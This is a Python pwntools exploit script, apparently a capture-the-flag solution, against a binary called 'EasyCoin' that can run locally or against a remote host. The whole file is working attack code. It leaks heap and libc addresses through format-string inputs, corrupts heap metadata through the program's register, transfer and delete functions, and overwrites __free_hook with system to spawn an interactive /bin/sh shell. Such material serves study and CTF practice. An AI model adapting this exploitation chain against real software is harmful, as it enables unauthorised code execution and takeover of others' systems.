from pwn import *

debug = 1
elf=ELF('./EasyCoin')

if debug:
    p = process('./EasyCoin')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    context.log_level = 'debug'
   

else:
    p = remote('106.75.20.44',  9999)
    #libc = ELF('./libc.so.6')
    context.log_level = 'debug'

def reg(username, password):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('> ')
    p.send(username)
    p.recvuntil('> ')
    p.send(password)
    p.recvuntil('> ')
    p.send(password)

def login(username, password):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('> ')
    p.send(username)
    p.recvuntil('> ')
    p.send(password)

def display_user():
    p.recvuntil('> ')
    p.sendline('1')

def send_coin(username, money):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('> ')
    p.send(username)
    p.recvuntil('> ')
    p.sendline(str(money))

def display_transactpn():
    p.recvuntil('> ')
    p.sendline('3')

def change_password(password):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil('> ')
    p.send(password)

def delete():
    p.recvuntil('> ')
    p.sendline('5')

def logout():
    p.recvuntil('> ')
    p.sendline('6')

reg('p4nda\n','pwn\n')
reg('/bin/sh\n', '\x00'*0x10+'\x02')
login('p4nda\n','pwn\n')
p.recvuntil('> ')
p.send('%9$p')
p.recvuntil('Command: ')
heap_base = int(p.recvuntil('\x7f')[:-2], 16) - 0x10
p.recvuntil('> ')
p.send('%3$p')
p.recvuntil('Command: ')
libc.address = int(p.recvuntil('\x7f')[:-2], 16)- 0xf72c0#- 7 - libc.symbols['__write_nocancel'] 
print '[*] system:',hex(libc.symbols['system'])
print '[*] heap  :',hex(heap_base)
send_coin('/bin/sh\n',0x111)
delete()
reg('p4nda\n','pwn\n')
login('p4nda\n','pwn\n')
send_coin('/bin/sh\n',heap_base+0x100)
send_coin('p4nda\n',0x3333)
#gdb.attach(p,'b *0x401474')
delete()
login('/bin/sh',p64(heap_base+0x30))
send_coin('/bin/sh',0x4444)
#gdb.attach(p,'b *0x400b0f')
change_password(p64(heap_base+0xa0-0x10))
logout()
reg("i_am_padding\n",p64(heap_base+0xd0)+p64(libc.symbols['__free_hook'])+p64(0xdeadbeef)+p64(0)[:-1])
login('/bin/sh','\n')
change_password(p64(libc.symbols['system'])+'\n')
delete()

p.interactive()